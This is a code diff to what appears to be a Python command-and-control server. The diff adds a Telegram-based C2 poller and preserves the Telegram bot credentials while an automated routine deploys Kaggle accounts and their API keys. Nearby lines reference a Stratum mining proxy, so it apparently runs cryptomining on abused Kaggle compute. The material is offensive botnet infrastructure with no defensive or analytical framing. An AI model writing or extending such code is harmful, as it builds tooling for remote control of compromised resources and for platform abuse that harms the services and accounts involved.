@@ -45,6 +45,14 @@ try:
 except ImportError:
     KAGGLE_C2_AVAILABLE = False
 
+# Telegram C2 Poller
+try:
+    from src.c2.telegram_poller import TelegramPoller
+    TELEGRAM_POLLER = None
+except ImportError:
+    TelegramPoller = None
+    TELEGRAM_POLLER = None
+
 # Stratum Proxy for Kaggle mining
 try:
     from src.utils.proxy import proxy_bp
@@ -4632,7 +4640,7 @@ print(result)
             else:
                 raise Exception(f"API key generation failed: {result.stderr[:100]}")
             
-            # Stage 3: Update config.json
+            # Stage 3: Update config.json (preserve Telegram C2)
             _log("Stage 3: Updating config.json...")
             kaggle_auto_deploy_progress["stage"] = "config"
             
@@ -4643,11 +4651,24 @@ print(result)
                     cfg = json.loads(config_path.read_text())
                 except: pass
             
+            # Preserve Telegram C2 config
+            telegram_bot_token = cfg.get("telegram_bot_token")
+            telegram_chat_id = cfg.get("telegram_chat_id")
+            
             cfg["kaggle_username"] = account.get("username")
             cfg["kaggle_api_key"] = account.get("api_key")
             cfg["updated"] = int(time.time())
+            
+            # Ensure Telegram C2 is preserved
+            if telegram_bot_token:
+                cfg["telegram_bot_token"] = telegram_bot_token
+            if telegram_chat_id:
+                cfg["telegram_chat_id"] = telegram_chat_id
+            
             config_path.write_text(json.dumps(cfg, indent=2))
             _log(f"✓ Config updated for: {account.get('username')}")
+            if telegram_bot_token and telegram_chat_id:
+                _log(f"✓ Telegram C2 preserved: chat_id={telegram_chat_id}")
             
             # Stage 4: Create dataset and kernel
             _log("Stage 4: Creating dataset and kernel...")
@@ -5740,7 +5761,7 @@ def main():
     print(f"""
 ╔══════════════════════════════════════════╗
 ║           C2 COMMAND & CONTROL           ║
-║──────────────────────────────────────────║
+──────────────────────────────────────────║
 ║  Host:  {args.host:<33}║
 ║  Port:  {args.port:<33}║
 ║  SSL:   {'ON' if ssl_ctx else 'OFF':<33}║
@@ -5748,6 +5769,16 @@ def main():
 ╚══════════════════════════════════════════╝
 """)
     log_event("server_start", f"{args.host}:{args.port}")
+    
+    # Start Telegram poller if configured
+    global TELEGRAM_POLLER
+    if TelegramPoller:
+        tg_token = get_config("telegram_bot_token", "")
+        if tg_token:
+            print("[*] Starting Telegram poller...")
+            TELEGRAM_POLLER = TelegramPoller(tg_token, app)
+            TELEGRAM_POLLER.start()
+    
     _suppress_connection_errors()
     
     if ssl_ctx:
